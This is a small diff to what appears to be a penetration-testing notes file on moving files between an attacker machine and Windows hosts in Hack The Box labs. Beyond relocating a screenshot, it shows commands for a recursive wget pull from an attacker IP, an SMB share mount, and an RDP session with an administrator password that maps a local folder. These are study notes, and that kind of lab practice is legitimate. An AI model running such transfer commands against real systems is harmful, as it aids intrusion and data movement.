@@ -15,7 +15,6 @@ wget -r -np http://10.10.14.98
 ## From Attack to Windows
 
 
-<img width="704" alt="Screen Shot 2022-09-06 at 5 49 22 PM" src="https://github.com/dbissell6/Shadow_Stone/assets/50979196/01e8ecf4-156e-4408-b83c-c4b6e12f3407">
 
 
 ### windows without curl or wget can use
@@ -58,6 +57,10 @@ victim
 net use n: \\192.168.220.133\share /user:test test
 ```
 ### Mount linux folder with rdp
+
+<img width="704" alt="Screen Shot 2022-09-06 at 5 49 22 PM" src="https://github.com/dbissell6/Shadow_Stone/assets/50979196/01e8ecf4-156e-4408-b83c-c4b6e12f3407">
+
+
 ```
 xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
 ```
